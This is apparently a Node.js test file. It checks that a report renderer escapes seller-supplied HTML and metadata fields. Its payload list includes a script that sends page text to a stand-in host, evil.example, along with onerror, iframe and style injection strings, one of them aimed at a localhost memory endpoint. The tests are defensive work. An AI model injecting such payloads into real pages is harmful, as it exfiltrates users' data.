import assert from "node:assert/strict";
import test from "node:test";
import { renderReportHtml } from "./pdf-report.js";

test("renders seller HTML payloads as inert text", () => {
  const payloads = [
    "<script>fetch('https://evil.example/' + document.body.innerText)</script>",
    '<img src="https://evil.example/pixel" onerror="alert(1)">',
    '<iframe src="http://127.0.0.1:9374/v1/memory"></iframe>',
    '</div><style>body{display:none}</style><div>',
    '<a href="https://evil.example">click</a>',
  ];

  for (const payload of payloads) {
    const html = renderReportHtml(payload, {
      jobId: "7",
      date: "23 July 2026",
      symbols: "AAPL",
    });
    assert.ok(html.includes("&lt;"));
    assert.doesNotMatch(html, /<(script|img|iframe|a)\b/i);
    assert.doesNotMatch(html, /\bon(?:error|load)\s*=\s*["']/i);
    assert.doesNotMatch(html, /<\/div><style>body\{display:none\}/i);
  }
});

test("escapes every metadata field", () => {
  const html = renderReportHtml("safe", {
    jobId: '7</div><script>alert(1)</script>',
    date: '<img src=x onerror="alert(1)">',
    symbols: 'AAPL</div><iframe src="https://evil.example">',
  });
  assert.doesNotMatch(html, /<(script|img|iframe)\b/i);
  assert.match(html, /&lt;script&gt;/);
  assert.match(html, /&lt;img/);
  assert.match(html, /&lt;iframe/);
});

test("contains no browser-side script while preserving report styling", () => {
  const html = renderReportHtml(
    "# Verdict\n\n> **BUY**\n\nReturn: +12.5% and drawdown: -3.2%\n\n| Symbol | View |\n| --- | --- |\n| AAPL | HOLD |",
    { jobId: "7", date: "23 July 2026", symbols: "AAPL" },
  );
  assert.doesNotMatch(html, /<script\b/i);
  assert.doesNotMatch(html, /\.innerHTML\s*=/);
  assert.match(html, /<h1>Verdict<\/h1>/);
  assert.match(html, /badge-buy/);
  assert.match(html, /badge-hold/);
  assert.match(html, /class="pos"/);
  assert.match(html, /class="neg"/);
  assert.match(html, /<table>/);
});
